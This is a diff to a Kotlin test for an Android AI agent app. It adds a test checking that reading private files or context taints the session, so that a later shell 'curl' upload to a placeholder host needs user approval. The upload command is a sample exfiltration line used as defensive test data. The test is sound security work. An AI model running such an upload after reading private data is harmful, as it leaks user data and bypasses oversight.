@@ -5,6 +5,7 @@ import android.content.SharedPreferences
 import androidx.test.core.app.ApplicationProvider
 import com.aharou.core.config.FullAccessCapability
 import com.aharou.feature.agent.domain.model.AgentContext
+import com.aharou.feature.agent.domain.permission.TaintTracker
 import com.aharou.feature.agent.domain.tool.ToolRegistry
 import com.aharou.feature.agent.domain.tool.ToolResult
 import com.aharou.feature.plugin.runtime.AppControlTool
@@ -41,6 +42,7 @@ class AppControlToolTest {
     }
 
     @After fun revoke() {
+        TaintTracker.clear(context.sessionId.orEmpty())
         try {
             if (::tool.isInitialized) FullAccessCapability.setEnabled(false)
         } finally {
@@ -80,6 +82,44 @@ class AppControlToolTest {
         val read = tool.executeWithContext(args("read", "path" to value(file.path)), context) as ToolResult.Success
         assertEquals("after", read.data.jsonObject.getValue("content").jsonPrimitive.content)
         assertNotEquals(digest, read.data.jsonObject.getValue("sha256").jsonPrimitive.content)
+    }
+
+    @Test fun privateReadsTaintOnlyAfterSuccessfulExecutionAndGateSubsequentEgress() = runBlocking {
+        val sessionId = context.sessionId.orEmpty()
+        val file = File(application.filesDir, "app-control-private.txt").apply { writeText("private fixture") }
+        TaintTracker.clear(sessionId)
+        FullAccessCapability.setEnabled(false)
+        assertTrue(tool.executeWithContext(args("read", "path" to value(file.path)), context) is ToolResult.Error)
+        assertFalse(TaintTracker.isTainted(sessionId))
+        FullAccessCapability.setEnabled(true)
+        assertTrue(tool.executeWithContext(args("read", "path" to value("relative.txt")), context) is ToolResult.Error)
+        assertFalse(TaintTracker.isTainted(sessionId))
+        val rules = io.mockk.mockk<com.aharou.feature.agent.domain.permission.PermissionRulesRepository>()
+        io.mockk.coEvery { rules.loadEffectiveFor(any()) } returns listOf(com.aharou.feature.agent.domain.permission.PermissionRule(
+            "Bash", "curl", com.aharou.feature.agent.domain.permission.PermissionDecision.ALLOW))
+        val safety = io.mockk.mockk<com.aharou.feature.settings.data.repository.ToolSafetySettingsRepository>(relaxed = true)
+        val policy = com.aharou.feature.agent.domain.permission.ToolPermissionPolicyEngine(rules, safety)
+        val outgoing = object : com.aharou.feature.agent.domain.tool.AgentTool() {
+            override val name = "Bash"
+            override val description = "fixture"
+            override val parameters = emptyMap<String, com.aharou.feature.agent.domain.tool.ToolParameter>()
+            override val capabilities = setOf(com.aharou.feature.agent.domain.tool.ToolCapability.EXECUTE_COMMANDS)
+        }
+        listOf(args("read", "path" to value(file.path)), args("list", "path" to value(application.filesDir.path)),
+            args("reflect", "operation" to value("reflect.context"))).forEach { read ->
+            TaintTracker.clear(sessionId)
+            assertTrue(tool.executeWithContext(read, context) is ToolResult.Success)
+            assertTrue(TaintTracker.isTainted(sessionId))
+            val verdict = policy.evaluate(outgoing, "Bash", args("unused", "command" to value("curl https://example.invalid/upload")),
+                com.aharou.feature.agent.domain.model.AgentMode.BUILD, context.projectRoot, sessionId)
+            assertEquals(com.aharou.feature.agent.domain.permission.ToolPermissionPolicyEngine.Verdict.ASK, verdict.verdict)
+            assertNotNull(verdict.taintedReason)
+        }
+        val handle = (tool.executeWithContext(args("reflect", "operation" to value("reflect.context")), context) as ToolResult.Success).data
+        TaintTracker.clear(sessionId)
+        assertTrue(tool.executeWithContext(args("reflect", "operation" to value("reflect.release"),
+            "arguments" to buildJsonObject { put("target", handle) }), context) is ToolResult.Success)
+        assertFalse(TaintTracker.isTainted(sessionId))
     }
 
     @Test fun reflectionHandlesAreSessionIsolatedAndRevokedImmediately() = runBlocking {
